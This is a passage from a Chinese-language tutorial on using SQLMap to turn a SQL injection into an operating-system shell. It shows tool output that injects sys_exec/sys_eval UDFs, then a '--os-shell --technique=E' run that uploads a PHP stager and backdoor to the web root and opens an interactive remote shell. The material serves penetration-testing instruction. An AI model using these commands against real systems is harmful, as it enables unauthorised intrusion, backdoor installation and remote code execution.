[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la
do you want to retrieve the command standard output? [Y/n/a] a

[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
No output
```

我们看到 SQLMap 默认使用了 `UNION` 技术来获取 OS shell，但未能给我们任何输出 `No output`。因此，由于我们已经知道存在多种类型的 SQL 注入漏洞，让我们尝试指定另一种更有可能给我们直接输出的技术，比如基于错误的 SQL 注入 (Error-based SQL Injection)，我们可以用 `--technique=E` 来指定：

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
        ___
       __H__ ___ ___[,]_____ ___ ___  {1.4.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 18:05:59 /2020-11-19/

[18:05:59] [INFO] resuming back-end DBMS 'mysql'
[18:05:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
...SNIP...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4

do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y

[18:06:07] [WARNING] unable to automatically retrieve the web server document root
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 1

[18:06:09] [WARNING] unable to automatically parse any web server path
[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER

os-shell> ls -la

do you want to retrieve the command standard output? [Y/n/a] a

command standard output:
---
total 156
drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
...SNIP...
---
```

正如我们所见，这次 SQLMap 成功地让我们进入了一个易于使用的交互式远程 shell，通过这种 SQLi 为我们提供了轻松的远程代码执行能力。

> **注意:** SQLMap 首先询问我们这个远程服务器使用的 Web 应用程序语言类型，我们知道是 PHP。然后它询问服务器 Web 根目录，我们要求 SQLMap 使用“常见位置”(common location(s)) 自动查找。这两个选项都是默认选项，如果我们给 SQLMap 添加了 `--batch` 选项，它们就会被自动选择。

